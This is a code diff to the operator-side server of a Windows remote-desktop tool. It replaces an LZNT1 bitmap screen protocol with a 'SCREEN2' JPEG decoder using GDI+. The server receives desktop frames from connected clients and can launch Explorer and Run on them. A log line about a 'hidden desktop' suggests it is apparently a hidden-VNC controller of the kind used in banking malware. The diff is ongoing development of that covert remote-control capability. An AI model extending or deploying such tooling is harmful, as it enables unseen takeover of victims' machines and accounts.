@@ -1,4 +1,8 @@
 #include "Server.h"
+#include "../common/ScreenTransfer/ScreenCodec.h"
+
+#include <GdiPlus.h>
+#include <vector>
 
 
 typedef NTSTATUS (NTAPI *T_RtlDecompressBuffer)
@@ -54,6 +58,8 @@ enum SysMenuIds   { fullScreen = 101, startExplorer = WM_USER + 1, startRun, sta
 static Client           g_clients[gc_maxClients];
 static DWORD            g_nextSessionId = 1;
 static CRITICAL_SECTION g_critSec;
+static ULONG_PTR        g_gdiplusToken = 0;
+static BOOL             g_gdiplusStarted = FALSE;
 
 static const TCHAR *ConnectionName(int connection)
 {
@@ -185,6 +191,15 @@ static BOOL RecvPositiveDword(SOCKET s, DWORD *value)
       return FALSE;
    *value = (DWORD) received;
    return TRUE;
+}
+
+static BOOL RecvScreenPacket(SOCKET s, std::vector<BYTE>& packet)
+{
+   int packetSize = 0;
+   if(!RecvInt(s, &packetSize) || packetSize <= 0 || packetSize > (int) screen2::MAX_WIRE_PACKET_SIZE)
+      return FALSE;
+   packet.resize((size_t) packetSize);
+   return RecvAll(s, packet.data(), packetSize);
 }
 
 static BOOL SendInputMessage(SOCKET s, UINT msg, WPARAM wParam, LPARAM lParam)
@@ -503,99 +518,46 @@ static DWORD WINAPI ClientThread(PVOID param)
       LeaveCriticalSection(&g_critSec);
       wprintf(TEXT("[+] Desktop channel connected: %hs (session %lu)\n"), peerIp, sessionId);
 
-      BITMAPINFO bmpInfo;
-      bmpInfo.bmiHeader.biSize = sizeof(bmpInfo.bmiHeader);
-      bmpInfo.bmiHeader.biPlanes = 1;
-      bmpInfo.bmiHeader.biBitCount = 24;
-      bmpInfo.bmiHeader.biCompression = BI_RGB;
-      bmpInfo.bmiHeader.biClrUsed = 0;
-
+      screen2::ScreenFrameDecoder decoder;
+      DWORD announcedScreenWidth = 0;
+      DWORD announcedScreenHeight = 0;
       BOOL firstFrameLogged = FALSE;
-      BOOL noFrameLogged = FALSE;
       for(;;)
       {
-         RECT rect;
-         GetClientRect(client->hWnd, &rect);
+         std::vector<BYTE> packet;
+         if(!RecvScreenPacket(s, packet))
+            goto exit;
 
-         if(rect.right == 0)
+         SCREEN_SIZE_MSG sizeMsg = {};
+         if(screen2::TryParseScreenSizePacket(packet.data(), packet.size(), sizeMsg))
          {
-            BOOL x = ResetEvent(client->minEvent);
-            WaitForSingleObject(client->minEvent, 5000);
+            announcedScreenWidth = sizeMsg.width > 0 ? (DWORD) sizeMsg.width : 0;
+            announcedScreenHeight = sizeMsg.height > 0 ? (DWORD) sizeMsg.height : 0;
+            wprintf(TEXT("[diag] SCREEN2 size: %hs (session %lu), virtual=(%d,%d), screen=%lux%lu\n"),
+               peerIp, sessionId, sizeMsg.virtualX, sizeMsg.virtualY, announcedScreenWidth, announcedScreenHeight);
             continue;
          }
 
-         int realRight = (rect.right > client->screenWidth && client->screenWidth > 0) ? client->screenWidth : rect.right;
-         int realBottom = (rect.bottom > client->screenHeight && client->screenHeight > 0) ? client->screenHeight : rect.bottom;
-
-         if((realRight * 3) % 4)
-            realRight += ((realRight * 3) % 4);
-
-         if(!SendInt(s, realRight))
-            goto exit;
-         if(!SendInt(s, realBottom))
-            goto exit;
-
-         int value;
-         if(!RecvInt(s, &value))
-            goto exit;
-         if(!value)
+         screen2::DecodedFrame frame;
+         bool needsKeyframe = false;
+         if(!decoder.DecodePacket(packet.data(), packet.size(), frame, needsKeyframe))
          {
-            if(!noFrameLogged)
-            {
-               wprintf(TEXT("[diag] Desktop channel has no changed frame yet: %hs (session %lu). Hidden desktop may be empty.\n"), peerIp, sessionId);
-               noFrameLogged = TRUE;
-            }
-            Sleep(gc_sleepNotRecvPixels);
+            wprintf(TEXT("[!] SCREEN2 frame decode failed: %hs (session %lu), requestKeyframe=%u, packet=%zu bytes\n"),
+               peerIp, sessionId, needsKeyframe ? 1U : 0U, packet.size());
+            if(!SendInt(s, needsKeyframe ? 1 : 0))
+               goto exit;
             continue;
          }
-         DWORD screenWidth;
-         DWORD screenHeight;
-         DWORD width;
-         DWORD height;
-         DWORD size;
-         if(!RecvPositiveDword(s, &screenWidth))
-            goto exit;
-         if(!RecvPositiveDword(s, &screenHeight))
-            goto exit;
-         if(!RecvPositiveDword(s, &width))
-            goto exit;
-         if(!RecvPositiveDword(s, &height))
-            goto exit;
-         if(!RecvPositiveDword(s, &size))
-            goto exit;
 
-         if(width > (DWORD) realRight || height > (DWORD) realBottom)
+         DWORD width = (DWORD) frame.width;
+         DWORD height = (DWORD) frame.height;
+         if(!width || !height || frame.stride < frame.width * 3 || frame.pixels.empty() || frame.pixels.size() > MAXDWORD)
             goto exit;
-         if(width > MAXDWORD / 3 / height)
-            goto exit;
-         DWORD newPixelsSize = width * 3 * height;
-         if(size > newPixelsSize)
-            goto exit;
-
-         BYTE *compressedPixels = (BYTE *) malloc(size);
-         if(!compressedPixels)
-            goto exit;
-         if(!RecvAll(s, compressedPixels, (int) size))
-         {
-            free(compressedPixels);
-            goto exit;
-         }
-
+         DWORD newPixelsSize = (DWORD) frame.pixels.size();
          BYTE *newPixels = (BYTE *) malloc(newPixelsSize);
          if(!newPixels)
-         {
-            free(compressedPixels);
             goto exit;
-         }
-
-         DWORD decompressedSize = 0;
-         NTSTATUS status = pRtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1, newPixels, newPixelsSize, compressedPixels, size, &decompressedSize);
-         free(compressedPixels);
-         if(status < 0 || decompressedSize != newPixelsSize)
-         {
-            free(newPixels);
-            goto exit;
-         }
+         memcpy(newPixels, frame.pixels.data(), newPixelsSize);
 
          EnterCriticalSection(&g_critSec);
          BOOL frameReady = FALSE;
@@ -621,21 +583,6 @@ static DWORD WINAPI ClientThread(PVOID param)
             if(!hDc)
                goto frame_cleanup;
 
-            if(client->pixels && client->pixelsWidth == width && client->pixelsHeight == height)
-            {
-               for(DWORD i = 0; i < newPixelsSize; i += 3)
-               {
-                  if(newPixels[i]     == GetRValue(gc_trans) &&
-                     newPixels[i + 1] == GetGValue(gc_trans) &&
-                     newPixels[i + 2] == GetBValue(gc_trans))
-                  {
-                     newPixels[i] = client->pixels[i];
-                     newPixels[i + 1] = client->pixels[i + 1];
-                     newPixels[i + 2] = client->pixels[i + 2];
-                  }
-               }
-            }
-
             hDcBmp = CreateCompatibleDC(hDc);
             if(!hDcBmp)
                goto frame_cleanup;
@@ -644,9 +591,16 @@ static DWORD WINAPI ClientThread(PVOID param)
             if(!hBmp)
                goto frame_cleanup;
 
+            BITMAPINFO bmpInfo;
+            memset(&bmpInfo, 0, sizeof(bmpInfo));
+            bmpInfo.bmiHeader.biSize = sizeof(bmpInfo.bmiHeader);
+            bmpInfo.bmiHeader.biPlanes = 1;
+            bmpInfo.bmiHeader.biBitCount = 24;
+            bmpInfo.bmiHeader.biCompression = BI_RGB;
+            bmpInfo.bmiHeader.biClrUsed = 0;
             bmpInfo.bmiHeader.biSizeImage = newPixelsSize;
             bmpInfo.bmiHeader.biWidth = width;
-            bmpInfo.bmiHeader.biHeight = height;
+            bmpInfo.bmiHeader.biHeight = -((LONG) height);
             if(SetDIBits(hDcBmp,
                hBmp,
                0,
@@ -667,8 +621,8 @@ static DWORD WINAPI ClientThread(PVOID param)
             oldSelectedObject = client->hOldBmp;
             oldPixels = client->pixels;
 
-            client->screenWidth = screenWidth;
-            client->screenHeight = screenHeight;
+            client->screenWidth = announcedScreenWidth ? announcedScreenWidth : width;
+            client->screenHeight = announcedScreenHeight ? announcedScreenHeight : height;
             client->pixels = newPixels;
             client->pixelsWidth = width;
             client->pixelsHeight = height;
@@ -701,14 +655,14 @@ frame_cleanup:
 
          if(!firstFrameLogged)
          {
-            wprintf(TEXT("[+] First desktop frame rendered: %hs (session %lu), remote=%lux%lu, frame=%lux%lu, compressed=%lu bytes\n"),
+            wprintf(TEXT("[+] First SCREEN2 desktop frame rendered: %hs (session %lu), remote=%lux%lu, frame=%lux%lu, packet=%zu bytes\n"),
                peerIp,
                sessionId,
-               screenWidth,
-               screenHeight,
+               announcedScreenWidth ? announcedScreenWidth : width,
+               announcedScreenHeight ? announcedScreenHeight : height,
                width,
                height,
-               size);
+               packet.size());
             firstFrameLogged = TRUE;
          }
 
@@ -851,6 +805,16 @@ BOOL StartServer(int port)
 
    InitializeCriticalSection(&g_critSec);
    memset(g_clients, 0, sizeof(g_clients));
+
+   Gdiplus::GdiplusStartupInput gdiplusStartupInput;
+   if(Gdiplus::GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL) == Gdiplus::Ok)
+   {
+      g_gdiplusStarted = TRUE;
+      wprintf(TEXT("[diag] GDI+ startup: ok\n"));
+   }
+   else
+      wprintf(TEXT("[!] GDI+ startup failed; SCREEN2 JPEG decode may fail\n"));
+
    if(CW_Register(WndProc))
       wprintf(TEXT("[diag] Control window class registered\n"));
    else
